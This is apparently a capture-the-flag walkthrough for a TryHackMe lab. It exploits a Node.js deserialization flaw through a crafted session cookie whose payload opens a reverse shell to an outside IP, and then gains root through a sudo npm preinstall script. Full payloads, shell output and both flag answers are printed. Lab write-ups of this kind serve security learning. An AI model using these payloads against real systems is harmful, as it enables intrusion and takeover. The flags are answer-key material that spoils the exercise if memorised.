# Retro Walkthrough
### Link
- https://tryhackme.com/room/jason
---
### Recon
```
nmap -sC -sC -p- [IP]
```
**Namp scan result**
```
```
Let's check  the website. We gather interesting information from the homepage : Built with NodeJs

Now, chexk the source page
```
 <script>
    document.getElementById("signup").addEventListener("click", function() {
	var date = new Date();
    	date.setTime(date.getTime()+(-1*24*60*60*1000));
    	var expires = "; expires="+date.toGMTString();
    	document.cookie = "session=foobar"+expires+"; path=/";
    	const Http = new XMLHttpRequest();
        console.log(location);
        const url=window.location.href+"?email="+document.getElementById("fname").value;
        Http.open("POST", url);
        Http.send();
	setTimeout(function() {
		window.location.reload();
	}, 500);
    }); 
    </script>
```
Great finding :  const url=window.location.href+"?email="+document.getElementById("fname").value;

Now, Let's check what happens if I put an email.

Try this email: test@test.com and if we check the session token : eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==

*Reverse*
```
echo eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ== | base64 -d
{"email":"test@test.com"}
```

We have an opportunity to manipulate the session cookie ^^
---
### Exploit
To be able to exploit a potential NodeJs, let's try this [exploit](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

- First: Create your payload
```
echo -n '{"email": "_$$ND_FUNC$$_function() { var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []);var client = new net.Socket();client.connect(4646, \"10.6.96.167\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;}()"}' | base64

eyJlbWFpbCI6ICJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKSB7IHZhciBuZXQgPSByZXF1aXJlKFwibmV0XCIpLCBjcCA9IHJlcXVpcmUoXCJjaGlsZF9wcm9jZXNzXCIpLCBzaCA9IGNwLnNwYXduKFwiL2Jpbi9zaFwiLCBbXSk7dmFyIGNsaWVudCA9IG5ldyBuZXQuU29ja2V0KCk7Y2xpZW50LmNvbm5lY3QoNDY0NiwgXCIxMC42Ljk2LjE2N1wiLCBmdW5jdGlvbigpe2NsaWVudC5waXBlKHNoLnN0ZGluKTtzaC5zdGRvdXQucGlwZShjbGllbnQpO3NoLnN0ZGVyci5waXBlKGNsaWVudCk7fSk7cmV0dXJuIC9hLzt9KCkifQ==
```
- Second: Start a listener
- Third: Change the current session token with the new one 
- Fourth: Result
```
Connection from 10.10.154.254:41110
whoami
dylan
ls -l
total 24
-r--r--r--  1 root root 3561 Sep  2 16:10 index.html
drwxr-xr-x 23 root root 4096 Jun 10  2021 node_modules
-rw-r--r--  1 root root  385 Jun 10  2021 package.json
-rw-r--r--  1 root root 6332 Jun 10  2021 package-lock.json
-rw-r--r--  1 root root 1454 Sep  2 16:10 server.js
pwd
/opt/webapp
ls -al
total 32
drwxr-xr-x  3 root root 4096 Sep  2 16:10 .
drwxr-xr-x  3 root root 4096 Jun 10  2021 ..
-r--r--r--  1 root root 3561 Sep  2 16:10 index.html
drwxr-xr-x 23 root root 4096 Jun 10  2021 node_modules
-rw-r--r--  1 root root  385 Jun 10  2021 package.json
-rw-r--r--  1 root root 6332 Jun 10  2021 package-lock.json
-rw-r--r--  1 root root 1454 Sep  2 16:10 server.js
cd home
/bin/sh: 5: cd: can't cd to home
cd /home
ls -l
total 4
drwxr-xr-x 5 dylan dylan 4096 Jun 10  2021 dylan
cd dylan
ls -la
total 40
drwxr-xr-x 5 dylan dylan 4096 Jun 10  2021 .
drwxr-xr-x 3 root  root  4096 Jun 10  2021 ..
lrwxrwxrwx 1 dylan dylan    9 Jun 10  2021 .bash_history -> /dev/null
-rw-r--r-- 1 dylan dylan  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 dylan dylan 3771 Feb 25  2020 .bashrc
drwx------ 2 dylan dylan 4096 Jun 10  2021 .cache
drwx------ 3 dylan dylan 4096 Jun 10  2021 .config
drwxrwxr-x 3 dylan dylan 4096 Jun 10  2021 .local
-rw-r--r-- 1 dylan dylan  807 Feb 25  2020 .profile
-rw-rw-r-- 1 dylan dylan   66 Jun 10  2021 .selected_editor
-rw-r--r-- 1 dylan dylan    0 Jun 10  2021 .sudo_as_admin_successful
-rw-r--r-- 1 dylan dylan   33 Jun 10  2021 user.txt
cat user.txt
0ba48780dee9f5677a4461f588af217c
```
**Question**
#### user.txt
**Answer** 
#### 0ba48780dee9f5677a4461f588af217c
---
### Privilege escalation
```
sudo -l
Matching Defaults entries for dylan on jason:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
```
Ok, we can run /usr/bin/npm without password.Let's check [gtfobins](https://gtfobins.github.io/gtfobins/npm/)
```
User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i

> @ preinstall /tmp/tmp.L9fV82nx7K
> /bin/sh

whoami
root
pwd
/tmp/tmp.L9fV82nx7K
cd /root/
ls -l
total 4
-rw-r--r-- 1 root root 33 Jun 10  2021 root.txt
cat root.txt
2cd5a9fd3a0024bfa98d01d69241760e
```
**Question**
#### root.txt
**Answer** 
#### 2cd5a9fd3a0024bfa98d01d69241760e
